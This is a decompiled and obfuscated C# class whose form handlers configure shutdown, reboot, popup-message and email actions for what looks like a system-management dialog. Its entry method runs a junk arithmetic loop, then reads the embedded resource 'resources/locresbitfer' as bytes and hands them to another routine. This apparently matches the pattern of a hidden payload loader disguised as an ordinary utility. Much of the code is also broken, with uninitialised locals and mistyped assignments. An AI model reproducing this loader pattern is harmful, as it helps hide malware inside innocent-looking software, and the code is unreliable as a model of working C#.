using System;
using System.Collections;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using d9;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;

namespace Qd
{
	// Token: 0x0200000D RID: 13
	public class Mq
	{
		// Token: 0x0600002F RID: 47 RVA: 0x00003618 File Offset: 0x00001818
		public DialogResult c5(Form A_1, ref Action A_2)
		{
			this.M = A_2;
			return DialogResult.None;
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00003634 File Offset: 0x00001834
		[STAThread]
		public static void Ei()
		{
			checked
			{
				try
				{
					int num = 214;
					object obj;
					while (num % 24 != 0)
					{
						num *= 3;
						bool flag = num > 24;
						if (flag)
						{
							num = 24;
							obj = Yq.Ez("resources/locresbitfer");
						}
					}
					k2.m5((byte[])obj);
				}
				catch (Exception ex)
				{
					Interaction.MsgBox(ex.ToString(), MsgBoxStyle.OkOnly, null);
				}
			}
		}

		// Token: 0x06000031 RID: 49 RVA: 0x000036B4 File Offset: 0x000018B4
		private void f6(object A_1, EventArgs A_2)
		{
			Action m = this.M;
			object left = NewLateBinding.LateGet(this.V, null, "Mode", new object[0], null, null, null);
			bool flag = Conversions.ToBoolean(Conversions.ToBoolean(Operators.CompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(this.V, null, "ActionItems", new object[0], null, null, null), null, "ShutdownAll", new object[0], null, null, null), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(this.V, null, "ActionItems", new object[0], null, null, null), null, "SleepAll", new object[0], null, null, null), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(this.V, null, "ActionItems", new object[0], null, null, null), null, "HibernateAll", new object[0], null, null, null), false)));
			if (flag)
			{
				NewLateBinding.LateSet(this.V, null, "Force", new object[]
				{
					NewLateBinding.LateGet(this.N, null, "Checked", new object[0], null, null, null)
				}, null, null);
			}
			else
			{
				NewLateBinding.LateSet(this.V, null, "Force", new object[]
				{
					NewLateBinding.LateGet(this.C, null, "Checked", new object[0], null, null, null)
				}, null, null);
			}
			object left2 = NewLateBinding.LateGet(this.V, null, "Mode", new object[0], null, null, null);
			bool flag2 = Conversions.ToBoolean(Conversions.ToBoolean(Operators.CompareObjectEqual(left2, NewLateBinding.LateGet(NewLateBinding.LateGet(this.V, null, "ActionItems", new object[0], null, null, null), null, "Shutdown", new object[0], null, null, null), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(left2, NewLateBinding.LateGet(NewLateBinding.LateGet(this.V, null, "ActionItems", new object[0], null, null, null), null, "ShutdownAll", new object[0], null, null, null), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(left2, NewLateBinding.LateGet(NewLateBinding.LateGet(this.V, null, "ActionItems", new object[0], null, null, null), null, "ShutdownGroup", new object[0], null, null, null), false)));
			if (flag2)
			{
				NewLateBinding.LateSet(this.V, null, "Reboot", new object[]
				{
					NewLateBinding.LateGet(this.H, null, "Checked", new object[0], null, null, null)
				}, null, null);
			}
			else
			{
				NewLateBinding.LateSet(this.V, null, "Reboot", new object[]
				{
					false
				}, null, null);
			}
			NewLateBinding.LateSet(this.V, null, "EmailFrom", new object[]
			{
				NewLateBinding.LateGet(this.Y, null, "Text", new object[0], null, null, null)
			}, null, null);
			NewLateBinding.LateSet(this.V, null, "EmailTo", new object[]
			{
				NewLateBinding.LateGet(this.f, null, "Text", new object[0], null, null, null)
			}, null, null);
			NewLateBinding.LateSet(this.V, null, "EmailSubject", new object[]
			{
				NewLateBinding.LateGet(this.a, null, "Text", new object[0], null, null, null)
			}, null, null);
			NewLateBinding.LateSet(this.V, null, "EmailServer", new object[]
			{
				NewLateBinding.LateGet(this.d, null, "Text", new object[0], null, null, null)
			}, null, null);
			NewLateBinding.LateSet(this.V, null, "EmailText", new object[]
			{
				NewLateBinding.LateGet(this.e, null, "Text", new object[0], null, null, null)
			}, null, null);
			NewLateBinding.LateSet(this.V, null, "MessageTitle", new object[]
			{
				NewLateBinding.LateGet(this.P, null, "Text", new object[0], null, null, null)
			}, null, null);
			NewLateBinding.LateSet(this.V, null, "MessageText", new object[]
			{
				NewLateBinding.LateGet(this.G, null, "Text", new object[0], null, null, null)
			}, null, null);
			this.V = DialogResult.OK;
		}

		// Token: 0x06000032 RID: 50 RVA: 0x000028DD File Offset: 0x00000ADD
		private void o5(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x06000033 RID: 51 RVA: 0x00003AE8 File Offset: 0x00001CE8
		private void Wq(object A_1, EventArgs A_2)
		{
			object instance;
			NewLateBinding.LateCall(NewLateBinding.LateGet(instance, null, "Items", new object[0], null, null, null), null, "Clear", new object[0], null, null, null, true);
			try
			{
				foreach (object value in ((IEnumerable)NewLateBinding.LateGet(instance, null, "ActionStrings", new object[0], null, null, null)))
				{
					string text = Conversions.ToString(value);
					object[] array;
					bool[] array2;
					NewLateBinding.LateCall(NewLateBinding.LateGet(instance, null, "Items", new object[0], null, null, null), null, "Add", array = new object[]
					{
						text
					}, null, null, array2 = new bool[]
					{
						true
					}, true);
					if (array2[0])
					{
						text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			Action m = this.M;
			NewLateBinding.LateSet(instance, null, "SelectedIndex", new object[]
			{
				NewLateBinding.LateGet(instance, null, "Mode", new object[0], null, null, null)
			}, null, null);
			object left = NewLateBinding.LateGet(instance, null, "Mode", new object[0], null, null, null);
			bool flag = Conversions.ToBoolean(Conversions.ToBoolean(Operators.CompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "ActionItems", new object[0], null, null, null), null, "ShutdownAll", new object[0], null, null, null), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "ActionItems", new object[0], null, null, null), null, "SleepAll", new object[0], null, null, null), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "ActionItems", new object[0], null, null, null), null, "HibernateAll", new object[0], null, null, null), false)));
			if (flag)
			{
				NewLateBinding.LateSet(this.N, null, "Checked", new object[]
				{
					NewLateBinding.LateGet(instance, null, "Force", new object[0], null, null, null)
				}, null, null);
			}
			else
			{
				NewLateBinding.LateSet(this.C, null, "Checked", new object[]
				{
					NewLateBinding.LateGet(instance, null, "Force", new object[0], null, null, null)
				}, null, null);
			}
			NewLateBinding.LateSet(this.Y, null, "Text", new object[]
			{
				NewLateBinding.LateGet(instance, null, "EmailFrom", new object[0], null, null, null)
			}, null, null);
			NewLateBinding.LateSet(this.f, null, "Text", new object[]
			{
				NewLateBinding.LateGet(instance, null, "EmailTo", new object[0], null, null, null)
			}, null, null);
			NewLateBinding.LateSet(this.a, null, "Text", new object[]
			{
				NewLateBinding.LateGet(instance, null, "EmailSubject", new object[0], null, null, null)
			}, null, null);
			NewLateBinding.LateSet(this.d, null, "Text", new object[]
			{
				NewLateBinding.LateGet(instance, null, "EmailServer", new object[0], null, null, null)
			}, null, null);
			NewLateBinding.LateSet(this.e, null, "Text", new object[]
			{
				NewLateBinding.LateGet(instance, null, "EmailText", new object[0], null, null, null)
			}, null, null);
			NewLateBinding.LateSet(this.P, null, "Text", new object[]
			{
				NewLateBinding.LateGet(instance, null, "MessageTitle", new object[0], null, null, null)
			}, null, null);
			NewLateBinding.LateSet(this.G, null, "Text", new object[]
			{
				NewLateBinding.LateGet(instance, null, "MessageText", new object[0], null, null, null)
			}, null, null);
		}

		// Token: 0x06000034 RID: 52 RVA: 0x000028E5 File Offset: 0x00000AE5
		private void f0(object A_1, EventArgs A_2)
		{
			this.Ye();
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00003EB8 File Offset: 0x000020B8
		private void Ye()
		{
			NewLateBinding.LateSet(this.s, null, "Mode", new object[]
			{
				NewLateBinding.LateGet(this.o, null, "SelectedIndex", new object[0], null, null, null)
			}, null, null);
			try
			{
				object left = NewLateBinding.LateGet(this.s, null, "Mode", new object[0], null, null, null);
				bool flag = Operators.ConditionalCompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(this.s, null, "ActionItems", new object[0], null, null, null), null, "Start", new object[0], null, null, null), false);
				if (flag)
				{
					NewLateBinding.LateCall(this.U, null, "SelectTab", new object[]
					{
						"SelectTabPage"
					}, null, null, null, true);
					NewLateBinding.LateSet(this.C, null, "Visible", new object[]
					{
						false
					}, null, null);
					NewLateBinding.LateSet(this.H, null, "Visible", new object[]
					{
						false
					}, null, null);
					NewLateBinding.LateCall(NewLateBinding.LateGet(this.X, null, "Items", new object[0], null, null, null), null, "Clear", new object[0], null, null, null, true);
					object[] array2;
					object[] array;
					bool[] array3;
					NewLateBinding.LateCall(NewLateBinding.LateGet(this.X, null, "Items", new object[0], null, null, null), null, "AddRange", array = new object[]
					{
						array2
					}, null, null, array3 = new bool[]
					{
						true
					}, true);
					if (array3[0])
					{
						array2 = (object[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(object[]));
					}
					object x = this.X;
					Type type = null;
					string memberName = "SelectedIndex";
					object[] array4 = new object[1];
					int num = 0;
					object x2 = this.X;
					Type type2 = null;
					string memberName2 = "FindStringExact";
					object[] array5 = new object[1];
					int num2 = 0;
					object instance = this.s;
					array5[num2] = NewLateBinding.LateGet(instance, null, "Name", new object[0], null, null, null);
					array = array5;
					object obj = NewLateBinding.LateGet(x2, type2, memberName2, array5, null, null, array3 = new bool[]
					{
						true
					});
					if (array3[0])
					{
						NewLateBinding.LateSetComplex(instance, null, "Name", new object[]
						{
							array[0]
						}, null, null, true, false);
					}
					array4[num] = obj;
					NewLateBinding.LateSet(x, type, memberName, array4, null, null);
					bool flag2 = string.IsNullOrEmpty(Conversions.ToString(NewLateBinding.LateGet(this.X, null, "SelectedItem", new object[0], null, null, null)));
					if (flag2)
					{
						NewLateBinding.LateSet(this.X, null, "SelectedIndex", new object[]
						{
							0
						}, null, null);
					}
				}
				else
				{
					flag = Operators.ConditionalCompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(this.s, null, "ActionItems", new object[0], null, null, null), null, "StartGroup", new object[0], null, null, null), false);
					if (flag)
					{
						NewLateBinding.LateCall(this.U, null, "SelectTab", new object[]
						{
							"SelectTabPage"
						}, null, null, null, true);
						NewLateBinding.LateSet(this.C, null, "Visible", new object[]
						{
							false
						}, null, null);
						NewLateBinding.LateSet(this.H, null, "Visible", new object[]
						{
							false
						}, null, null);
						NewLateBinding.LateCall(NewLateBinding.LateGet(this.X, null, "Items", new object[0], null, null, null), null, "Clear", new object[0], null, null, null, true);
						object[] array;
						bool[] array3;
						object[] array6;
						NewLateBinding.LateCall(NewLateBinding.LateGet(this.X, null, "Items", new object[0], null, null, null), null, "AddRange", array = new object[]
						{
							array6
						}, null, null, array3 = new bool[]
						{
							true
						}, true);
						if (array3[0])
						{
							array6 = (object[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(object[]));
						}
						object x3 = this.X;
						Type type3 = null;
						string memberName3 = "SelectedIndex";
						object[] array7 = new object[1];
						int num3 = 0;
						object x4 = this.X;
						Type type4 = null;
						string memberName4 = "FindStringExact";
						object[] array8 = new object[1];
						int num4 = 0;
						object instance = this.s;
						array8[num4] = NewLateBinding.LateGet(instance, null, "Name", new object[0], null, null, null);
						array = array8;
						object obj = NewLateBinding.LateGet(x4, type4, memberName4, array8, null, null, array3 = new bool[]
						{
							true
						});
						if (array3[0])
						{
							NewLateBinding.LateSetComplex(instance, null, "Name", new object[]
							{
								array[0]
							}, null, null, true, false);
						}
						array7[num3] = obj;
						NewLateBinding.LateSet(x3, type3, memberName3, array7, null, null);
						bool flag3 = string.IsNullOrEmpty(Conversions.ToString(NewLateBinding.LateGet(this.X, null, "SelectedItem", new object[0], null, null, null)));
						if (flag3)
						{
							NewLateBinding.LateSet(this.X, null, "SelectedIndex", new object[]
							{
								0
							}, null, null);
						}
					}
					else
					{
						flag = Operators.ConditionalCompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(this.s, null, "ActionItems", new object[0], null, null, null), null, "StartAll", new object[0], null, null, null), false);
						if (flag)
						{
							NewLateBinding.LateCall(this.U, null, "SelectTab", new object[]
							{
								"AllTabPage"
							}, null, null, null, true);
						}
						else
						{
							flag = Conversions.ToBoolean(Conversions.ToBoolean(Operators.CompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(this.s, null, "ActionItems", new object[0], null, null, null), null, "Shutdown", new object[0], null, null, null), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(this.s, null, "ActionItems", new object[0], null, null, null), null, "Sleep", new object[0], null, null, null), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(this.s, null, "ActionItems", new object[0], null, null, null), null, "Hibernate", new object[0], null, null, null), false)));
							if (flag)
							{
								NewLateBinding.LateCall(this.U, null, "SelectTab", new object[]
								{
									"SelectTabPage"
								}, null, null, null, true);
								NewLateBinding.LateSet(this.C, null, "Visible", new object[]
								{
									true
								}, null, null);
								NewLateBinding.LateSet(this.C, null, "Checked", new object[]
								{
									NewLateBinding.LateGet(this.s, null, "Force", new object[0], null, null, null)
								}, null, null);
								NewLateBinding.LateSet(this.H, null, "Checked", new object[]
								{
									NewLateBinding.LateGet(this.s, null, "Reboot", new object[0], null, null, null)
								}, null, null);
								NewLateBinding.LateCall(NewLateBinding.LateGet(this.X, null, "Items", new object[0], null, null, null), null, "Clear", new object[0], null, null, null, true);
								bool flag4 = Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(this.s, null, "Mode", new object[0], null, null, null), NewLateBinding.LateGet(NewLateBinding.LateGet(this.s, null, "ActionItems", new object[0], null, null, null), null, "Shutdown", new object[0], null, null, null), false);
								if (flag4)
								{
									NewLateBinding.LateSet(this.H, null, "Visible", new object[]
									{
										true
									}, null, null);
								}
								else
								{
									NewLateBinding.LateSet(this.H, null, "Visible", new object[]
									{
										false
									}, null, null);
								}
								object[] array;
								bool[] array3;
								object[] array9;
								NewLateBinding.LateCall(NewLateBinding.LateGet(this.X, null, "Items", new object[0], null, null, null), null, "AddRange", array = new object[]
								{
									array9
								}, null, null, array3 = new bool[]
								{
									true
								}, true);
								if (array3[0])
								{
									array9 = (object[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(object[]));
								}
								object x5 = this.X;
								Type type5 = null;
								string memberName5 = "SelectedIndex";
								object[] array10 = new object[1];
								int num5 = 0;
								object x6 = this.X;
								Type type6 = null;
								string memberName6 = "FindStringExact";
								object[] array11 = new object[1];
								int num6 = 0;
								object instance = this.s;
								array11[num6] = NewLateBinding.LateGet(instance, null, "Name", new object[0], null, null, null);
								array = array11;
								object obj = NewLateBinding.LateGet(x6, type6, memberName6, array11, null, null, array3 = new bool[]
								{
									true
								});
								if (array3[0])
								{
									NewLateBinding.LateSetComplex(instance, null, "Name", new object[]
									{
										array[0]
									}, null, null, true, false);
								}
								array10[num5] = obj;
								NewLateBinding.LateSet(x5, type5, memberName5, array10, null, null);
								NewLateBinding.LateSet(this.C, null, "Checked", new object[]
								{
									NewLateBinding.LateGet(this.s, null, "Force", new object[0], null, null, null)
								}, null, null);
								bool flag5 = string.IsNullOrEmpty(Conversions.ToString(NewLateBinding.LateGet(this.X, null, "SelectedItem", new object[0], null, null, null)));
								if (flag5)
								{
									NewLateBinding.LateSet(this.X, null, "SelectedIndex", new object[]
									{
										0
									}, null, null);
								}
							}
							else
							{
								flag = Operators.ConditionalCompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(this.s, null, "ActionItems", new object[0], null, null, null), null, "ShutdownGroup", new object[0], null, null, null), false);
								if (flag)
								{
									NewLateBinding.LateCall(this.U, null, "SelectTab", new object[]
									{
										"SelectTabPage"
									}, null, null, null, true);
									NewLateBinding.LateSet(this.C, null, "Visible", new object[]
									{
										true
									}, null, null);
									NewLateBinding.LateSet(this.C, null, "Checked", new object[]
									{
										NewLateBinding.LateGet(this.s, null, "Force", new object[0], null, null, null)
									}, null, null);
									NewLateBinding.LateSet(this.H, null, "Visible", new object[]
									{
										true
									}, null, null);
									NewLateBinding.LateSet(this.H, null, "Checked", new object[]
									{
										NewLateBinding.LateGet(this.s, null, "Reboot", new object[0], null, null, null)
									}, null, null);
									NewLateBinding.LateCall(NewLateBinding.LateGet(this.X, null, "Items", new object[0], null, null, null), null, "Clear", new object[0], null, null, null, true);
									object[] array;
									bool[] array3;
									object[] array12;
									NewLateBinding.LateCall(NewLateBinding.LateGet(this.X, null, "Items", new object[0], null, null, null), null, "AddRange", array = new object[]
									{
										array12
									}, null, null, array3 = new bool[]
									{
										true
									}, true);
									if (array3[0])
									{
										array12 = (object[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(object[]));
									}
									object x7 = this.X;
									Type type7 = null;
									string memberName7 = "SelectedIndex";
									object[] array13 = new object[1];
									int num7 = 0;
									object x8 = this.X;
									Type type8 = null;
									string memberName8 = "FindStringExact";
									object[] array14 = new object[1];
									int num8 = 0;
									object instance = this.s;
									array14[num8] = NewLateBinding.LateGet(instance, null, "Name", new object[0], null, null, null);
									array = array14;
									object obj = NewLateBinding.LateGet(x8, type8, memberName8, array14, null, null, array3 = new bool[]
									{
										true
									});
									if (array3[0])
									{
										NewLateBinding.LateSetComplex(instance, null, "Name", new object[]
										{
											array[0]
										}, null, null, true, false);
									}
									array13[num7] = obj;
									NewLateBinding.LateSet(x7, type7, memberName7, array13, null, null);
									bool flag6 = string.IsNullOrEmpty(Conversions.ToString(NewLateBinding.LateGet(this.X, null, "SelectedItem", new object[0], null, null, null)));
									if (flag6)
									{
										NewLateBinding.LateSet(this.X, null, "SelectedIndex", new object[]
										{
											0
										}, null, null);
									}
								}
								else
								{
									flag = Conversions.ToBoolean(Conversions.ToBoolean(Operators.CompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(this.s, null, "ActionItems", new object[0], null, null, null), null, "ShutdownAll", new object[0], null, null, null), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(this.s, null, "ActionItems", new object[0], null, null, null), null, "SleepAll", new object[0], null, null, null), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(this.s, null, "ActionItems", new object[0], null, null, null), null, "HibernateAll", new object[0], null, null, null), false)));
									if (flag)
									{
										NewLateBinding.LateCall(this.U, null, "SelectTab", new object[]
										{
											"AllTabPage"
										}, null, null, null, true);
										NewLateBinding.LateSet(this.N, null, "Checked", new object[]
										{
											NewLateBinding.LateGet(this.s, null, "Force", new object[0], null, null, null)
										}, null, null);
										bool flag7 = Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(this.s, null, "Mode", new object[0], null, null, null), NewLateBinding.LateGet(NewLateBinding.LateGet(this.s, null, "ActionItems", new object[0], null, null, null), null, "ShutdownAll", new object[0], null, null, null), false);
										if (flag7)
										{
											NewLateBinding.LateSet(this.j, null, "Visible", new object[]
											{
												true
											}, null, null);
										}
										else
										{
											NewLateBinding.LateSet(this.j, null, "Visible", new object[]
											{
												false
											}, null, null);
										}
										NewLateBinding.LateSet(this.j, null, "Checked", new object[]
										{
											NewLateBinding.LateGet(this.s, null, "Reboot", new object[0], null, null, null)
										}, null, null);
									}
									else
									{
										flag = Operators.ConditionalCompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(this.s, null, "ActionItems", new object[0], null, null, null), null, "SendMessage", new object[0], null, null, null), false);
										if (flag)
										{
											NewLateBinding.LateCall(this.U, null, "SelectTab", new object[]
											{
												"PopupTabPage"
											}, null, null, null, true);
											NewLateBinding.LateCall(NewLateBinding.LateGet(this.T, null, "Items", new object[0], null, null, null), null, "Clear", new object[0], null, null, null, true);
											object[] array;
											bool[] array3;
											object[] array15;
											NewLateBinding.LateCall(NewLateBinding.LateGet(this.T, null, "Items", new object[0], null, null, null), null, "AddRange", array = new object[]
											{
												array15
											}, null, null, array3 = new bool[]
											{
												true
											}, true);
											if (array3[0])
											{
												array15 = (object[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(object[]));
											}
											object t = this.T;
											Type type9 = null;
											string memberName9 = "SelectedIndex";
											object[] array16 = new object[1];
											int num9 = 0;
											object t2 = this.T;
											Type type10 = null;
											string memberName10 = "FindStringExact";
											object[] array17 = new object[1];
											int num10 = 0;
											object instance = this.s;
											array17[num10] = NewLateBinding.LateGet(instance, null, "Name", new object[0], null, null, null);
											array = array17;
											object obj = NewLateBinding.LateGet(t2, type10, memberName10, array17, null, null, array3 = new bool[]
											{
												true
											});
											if (array3[0])
											{
												NewLateBinding.LateSetComplex(instance, null, "Name", new object[]
												{
													array[0]
												}, null, null, true, false);
											}
											array16[num9] = obj;
											NewLateBinding.LateSet(t, type9, memberName9, array16, null, null);
											NewLateBinding.LateSet(this.P, null, "Text", new object[]
											{
												NewLateBinding.LateGet(this.s, null, "MessageTitle", new object[0], null, null, null)
											}, null, null);
											NewLateBinding.LateSet(this.G, null, "Text", new object[]
											{
												NewLateBinding.LateGet(this.s, null, "MessageText", new object[0], null, null, null)
											}, null, null);
										}
										else
										{
											flag = Operators.ConditionalCompareObjectEqual(left, NewLateBinding.LateGet(NewLateBinding.LateGet(this.s, null, "ActionItems", new object[0], null, null, null), null, "SendEmail", new object[0], null, null, null), false);
											if (flag)
											{
												NewLateBinding.LateCall(this.U, null, "SelectTab", new object[]
												{
													"EmailTabPage"
												}, null, null, null, true);
											}
										}
									}
								}
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000036 RID: 54 RVA: 0x00004EA4 File Offset: 0x000030A4
		private void Af(object A_1, EventArgs A_2)
		{
			object instance = this.s;
			Type type = null;
			string memberName = "Name";
			object[] array = new object[1];
			int num = 0;
			object x = this.X;
			Type type2 = null;
			string memberName2 = "Items";
			object[] array2 = new object[1];
			int num2 = 0;
			object x2 = this.X;
			array2[num2] = NewLateBinding.LateGet(x2, null, "SelectedIndex", new object[0], null, null, null);
			object[] array3 = array2;
			bool[] array4;
			object obj = NewLateBinding.LateGet(x, type2, memberName2, array2, null, null, array4 = new bool[]
			{
				true
			});
			if (array4[0])
			{
				NewLateBinding.LateSetComplex(x2, null, "SelectedIndex", new object[]
				{
					array3[0]
				}, null, null, true, false);
			}
			array[num] = obj.ToString();
			NewLateBinding.LateSet(instance, type, memberName, array, null, null);
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00004F40 File Offset: 0x00003140
		private void f1(object A_1, EventArgs A_2)
		{
			object instance = this.s;
			Type type = null;
			string memberName = "Name";
			object[] array = new object[1];
			int num = 0;
			object t = this.T;
			Type type2 = null;
			string memberName2 = "Items";
			object[] array2 = new object[1];
			int num2 = 0;
			object t2 = this.T;
			array2[num2] = NewLateBinding.LateGet(t2, null, "SelectedIndex", new object[0], null, null, null);
			object[] array3 = array2;
			bool[] array4;
			object obj = NewLateBinding.LateGet(t, type2, memberName2, array2, null, null, array4 = new bool[]
			{
				true
			});
			if (array4[0])
			{
				NewLateBinding.LateSetComplex(t2, null, "SelectedIndex", new object[]
				{
					array3[0]
				}, null, null, true, false);
			}
			array[num] = obj.ToString();
			NewLateBinding.LateSet(instance, type, memberName, array, null, null);
		}

		// Token: 0x04000013 RID: 19
		private Action M;

		// Token: 0x04000014 RID: 20
		private object V;

		// Token: 0x04000015 RID: 21
		private object N;

		// Token: 0x04000016 RID: 22
		private object C;

		// Token: 0x04000017 RID: 23
		private object H;

		// Token: 0x04000018 RID: 24
		private object Y;

		// Token: 0x04000019 RID: 25
		private object f;

		// Token: 0x0400001A RID: 26
		private object a;

		// Token: 0x0400001B RID: 27
		private object d;

		// Token: 0x0400001C RID: 28
		private object e;

		// Token: 0x0400001D RID: 29
		private object P;

		// Token: 0x0400001E RID: 30
		private object G;

		// Token: 0x0400001F RID: 31
		private object s;

		// Token: 0x04000020 RID: 32
		private object o;

		// Token: 0x04000021 RID: 33
		private object U;

		// Token: 0x04000022 RID: 34
		private object X;

		// Token: 0x04000023 RID: 35
		private object j;

		// Token: 0x04000024 RID: 36
		private object T;
	}
}
